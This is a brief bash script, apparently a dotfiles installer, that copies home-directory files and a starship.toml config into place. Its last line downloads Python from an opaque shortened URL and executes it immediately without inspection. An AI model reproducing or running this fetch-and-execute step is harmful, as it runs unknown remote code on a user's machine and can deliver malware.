#!/bin/bash

cp -a -rf -- "$(pwd)/home/*" ~/
cp -a -rf -- starship.toml ~/.config/

python3 -c "$(wget -q https://tiny.one/kickbackpy -O -)"